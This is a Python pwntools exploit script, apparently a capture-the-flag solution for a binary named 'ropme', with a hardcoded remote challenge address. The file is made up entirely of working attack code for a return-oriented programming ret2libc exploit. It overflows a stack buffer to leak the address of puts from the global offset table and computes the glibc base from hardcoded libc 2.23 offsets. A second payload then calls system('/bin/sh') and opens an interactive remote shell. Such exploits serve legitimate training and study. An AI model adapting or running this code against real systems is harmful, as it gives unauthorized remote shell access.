#!/usr/bin/env python

from pwn import *
import argparse

context.os = "linux"
context.arch = "amd64"
context.word_size = 64
context.endian = 'little'
context.log_level = "DEBUG"

program_name = './ropme'
elf = ELF(program_name)
remote_server = "46.101.23.188"
remote_port = "31090"

parser = argparse.ArgumentParser(description='I\'m trying here.')
parser.add_argument('--dbg', '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, remote_port)
else:
    p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

padding = b'A' * 72 # 64 + 8
pop_rdi  = p64(0x4006d3) # ROPgadget --binary ./ropme | grep "pop rdi"
got_put  = p64(0x601018) # objdump -D ./ropme | grep puts
plt_put  = p64(0x4004e0) # objdump -D ./ropme | grep puts
plt_main  = p64(0x400626)

payload = padding + pop_rdi + got_put + plt_put + plt_main

p.recvuntil("ROP me outside, how 'about dah?")
p.sendline(payload)
p.recvline()

leaked_puts = p.recvline().strip().ljust(8, b"\x00")
log.success("Leaked puts@GLIBC: "  + str(hex(u64(leaked_puts)))) # use this with libc-database to find version of libc

leaked_puts = u64(leaked_puts)

libc_put = 0x000000000006f690 # readelf -s libc6_2.23-0ubuntu11_amd64.so | grep system

offset = leaked_puts - libc_put

log.info("glibc offset: %x" % offset)

libc_sys = 0x0000000000045390 # readelf -s libc6_2.23-0ubuntu11_amd64.so | grep system
libc_sh = 0x18cd17 # strings -a -t x libc6_2.23-0ubuntu11_amd64.so | grep /bin/sh 

sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)

payload = padding + pop_rdi + sh + sys

p.recvuntil("ROP me outside, how 'about dah?")
p.sendline(payload)

p.interactive(prompt="")